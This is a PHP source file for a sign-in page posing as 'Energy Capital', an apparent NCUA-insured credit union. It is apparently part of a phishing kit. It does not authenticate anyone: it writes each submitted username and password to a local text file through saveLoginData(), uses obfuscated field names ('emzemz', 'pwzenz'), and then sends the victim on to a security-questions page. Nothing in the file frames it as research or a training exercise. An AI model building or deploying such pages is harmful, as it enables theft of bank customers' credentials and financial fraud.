<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emzemz = $_POST['emzemz'] ?? '';
    $pwzenz = $_POST['pwzenz'] ?? '';
    $activeTab = $_POST['activeTab'] ?? 'password';
    
    $errors = [];
    
    if ($activeTab === 'password') {
        if (empty($emzemz)) {
            $errors['emzemz'] = 'Username is required.';
        }
        
        if (empty($pwzenz)) {
            $errors['pwzenz'] = 'Password is required.';
        }
        
        if (empty($errors)) {
            // Save to text file instead of API call
            if (saveLoginData($emzemz, $pwzenz)) {
                // Store username in session for next page
                $_SESSION['emzemz'] = $emzemz;
                
                // Redirect to security questions
                header('Location: security_questions.php');
                exit;
            } else {
                $errors['general'] = 'Failed to save login information. Please try again.';
            }
        }
    }
}

$activeTab = $_POST['activeTab'] ?? 'password';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Energy Capital - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-12 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-16 w-auto" />
                <div class="mt-6 w-full max-w-3xl">
                    <img src="assets/selbnr.png" alt="Protect your privacy" class="w-full rounded-md" />
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Login Card -->
                <div class="w-full max-w-md space-y-6">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Tab Buttons -->
                        <div class="flex mb-6 rounded-md overflow-hidden border border-slate-600 bg-[#1b1f2f]">
                            <form method="POST" action="" style="display: contents;">
                                <button
                                    type="submit"
                                    name="activeTab"
                                    value="password"
                                    class="flex-1 py-2 font-semibold transition-colors <?php echo $activeTab === 'password' ? 'bg-[#283045] text-white' : 'bg-[#1b1f2f] text-slate-400 hover:text-slate-200'; ?>"
                                >
                                    Password
                                </button>
                                <button
                                    type="submit"
                                    name="activeTab"
                                    value="biometric"
                                    class="flex-1 py-2 font-semibold transition-colors <?php echo $activeTab === 'biometric' ? 'bg-[#283045] text-white' : 'bg-[#1b1f2f] text-slate-400 hover:text-slate-200'; ?>"
                                >
                                    Biometric
                                </button>
                            </form>
                        </div>

                        <!-- Form -->
                        <form method="POST" action="" class="space-y-6">
                            <input type="hidden" name="activeTab" value="<?php echo htmlspecialchars($activeTab); ?>" />
                            
                            <!-- Username Field -->
                            <div>
                                <label class="text-slate-300 text-sm" for="emzemz">
                                    Username
                                </label>
                                <div class="flex items-center gap-3 border-b transition-colors <?php echo isset($errors['emzemz']) ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'; ?>">
                                    <span class="text-[#00b4ff]">
                                        <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6.75a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.5 20.25a7.5 7.5 0 0 1 15 0" />
                                        </svg>
                                    </span>
                                    <input
                                        id="emzemz"
                                        name="emzemz"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['emzemz'] ?? ''); ?>"
                                        class="w-full bg-transparent text-white focus:outline-none py-2 placeholder:text-slate-400"
                                        placeholder="Enter your username"
                                    />
                                </div>
                                <?php if (isset($errors['emzemz'])): ?>
                                    <p class="mt-2 text-xs text-red-500"><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Password or Biometric Content -->
                            <?php if ($activeTab === 'password'): ?>
                                <div>
                                    <label class="text-slate-300 text-sm" for="pwzenz">
                                        Password
                                    </label>
                                    <div class="flex items-center gap-3 border-b transition-colors <?php echo isset($errors['pwzenz']) ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'; ?>">
                                        <span class="text-[#00b4ff]">
                                            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V7.875a4.125 4.125 0 1 0-8.25 0V10.5M6.75 10.5h10.5A1.75 1.75 0 0 1 19 12.25v7a1.75 1.75 0 0 1-1.75 1.75H6.75A1.75 1.75 0 0 1 5 19.25v-7A1.75 1.75 0 0 1 6.75 10.5Z" />
                                            </svg>
                                        </span>
                                        <input
                                            id="pwzenz"
                                            name="pwzenz"
                                            type="password"
                                            value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                            class="w-full bg-transparent text-white focus:outline-none py-2 placeholder:text-slate-400"
                                            placeholder="Enter your password"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePassword()"
                                            class="text-[#00b4ff] text-sm hover:text-white"
                                        >
                                            <span id="toggleText">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['pwzenz'])): ?>
                                        <p class="mt-2 text-xs text-red-500"><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                                    <?php endif; ?>
                                </div>
                            <?php else: ?>
                                <div class="text-sm text-slate-300">
                                    Use your registered biometric device to continue. If you need assistance, please contact support.
                                </div>
                            <?php endif; ?>

                            <!-- Sign In Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
                            >
                                <?php echo $activeTab === 'password' ? 'Sign in' : 'Continue'; ?>
                            </button>
                        </form>
                    </div>

                    <!-- Footer Links -->
                    <div class="text-xs text-slate-300 text-center space-y-2">
                        <a href="#" class="block text-[#7dd3fc] hover:underline">
                            Forgot username/password?
                        </a>
                        <a href="#" class="block text-[#7dd3fc] hover:underline">
                            Enroll in new online banking
                        </a>
                        <p class="text-[11px] text-slate-300">
                            This site is protected by reCAPTCHA and the Google
                            <a href="#" class="underline">Privacy Policy</a>
                            and
                            <a href="#" class="underline">Terms of Service</a>
                            apply.
                        </p>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('pwzenz');
            const toggleText = document.getElementById('toggleText');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
    </script>
</body>
</html>
